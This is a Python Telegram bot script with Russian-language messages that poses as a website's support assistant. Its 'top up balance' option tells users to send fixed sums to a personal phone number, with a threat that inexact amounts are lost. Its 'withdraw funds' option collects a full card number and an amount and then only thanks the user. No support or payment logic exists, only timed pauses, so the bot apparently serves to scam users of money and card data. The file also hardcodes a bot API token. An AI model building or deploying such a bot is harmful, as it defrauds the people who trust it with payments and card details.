import telebot, time
from telebot import types


bot = telebot.TeleBot('7020446645:AAH5vqulc9QJGazoUGoWbXeDoBiF_tJPJtc')


@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup()
    btn1 = types.KeyboardButton('Тех.поддержка')
    markup.row(btn1)
    btn2 = types.KeyboardButton('Пополнить баланс')
    btn3 = types.KeyboardButton('Вывести средства')
    markup.row(btn2, btn3)
    btn4 = types.KeyboardButton('Вернуться на сайт')
    markup.row(btn4)
    bot.send_message(message.chat.id, f'Здравствуйте, {message.from_user.first_name}! '
                                      f'Это бот помощник, он потсарается решить все ваши проблемы.'
                                      'Если у вас все еще останутся вопросы <u>перейдите в описание бота</u> - там указан'
                                      ' <b>номер</b> по которому вы можете связаться с нами.', parse_mode='html',
                     reply_markup=markup)
    bot.register_next_step_handler(message, on_click)


def on_click(message):
    if message.text == 'Тех.поддержка':
        bot.send_message(message.chat.id, 'Пожалуйста, опишите свою проблему')
        time.sleep(120)
        bot.send_message(message.chat.id, 'Благодарим за ожидание, с вами свяжется наш оператор')
    elif message.text == 'Пополнить баланс':
        bot.send_message(message.chat.id, 'Пришлите на номер +79153987767 '
                                          'одну из следующих сумм: '
                                          '300р; 500р; 1000р; 1500р; 2000+р; '
                                          'хотим предупредить, что при неточной отправке денег на сумму нижу 2000, '
                                          'ваш баланс не пополнится. После отправки пришлите скрин подтверждающий оплату.')
        time.sleep(120)
        bot.send_message(message.chat.id, 'Благодарим за сотрудничество!')
    elif message.text == 'Вывести средства':
        bot.send_message(message.chat.id, 'Введите номер карты  в фотмате: '
                                          '****_****_****_****')
        time.sleep(60)
        bot.send_message(message.chat.id, 'Введите желаемую сумму для вывода')
        time.sleep(60)
        bot.send_message(message.chat.id, 'Благодарим за сотрудничество!')


bot.polling(none_stop=True)